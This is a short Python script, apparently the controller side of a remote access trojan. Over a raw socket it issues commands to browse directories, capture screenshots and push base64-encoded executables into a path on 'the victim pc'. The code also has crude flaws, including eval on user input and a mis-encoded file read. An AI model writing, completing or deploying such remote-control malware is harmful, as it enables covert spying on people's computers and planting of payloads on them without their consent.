import socket
import os,sys
import cv2
import base64
import numpy as np
import pickle
import struct
import cv2,time
import zmq

hostname = socket.gethostname()    
ip = socket.gethostbyname(hostname)   
host=ip
port=5000

s=socket.socket()
s.connect((host,port))


message = input("->")
while (message != 'q'):
    s.sendall(message.encode('utf-8'))
    if(message == "dir()"):                         #dir()
        loc=eval(input("enter the location"))
        s.sendall(loc.encode('utf-8'))
        data = s.recv(1024).decode()
        while data:
            data = s.recv(1024).decode()
            print(data)
            if(data=='q'):
                break
    if(message=="screenshot()"):                   #screenshot()
        data = s.recv(4096000)
        f=open("screenshot1.png",'wb')
        f.write(data)
        f.close()
    if(message=="upload()"):              #upload
        a=''
        b=''
        c=''
        print("enter the filename \nhint: lol.exe")
        a=input()
        print("enter the file location of the file you want to upload \n hint: f:\ ")
        b=input()
        print("enter the path where it has to be stored in the victim pc")
        c=input()
        f=open(b+a,"r")
        string = base64.b64encode(f.read())
        s.send(string)
        s.send(a.encode('utf-8'))
        s.send(c.encode('utf-8'))
    print("next command\n")
    message = input("->")
s.close()


        
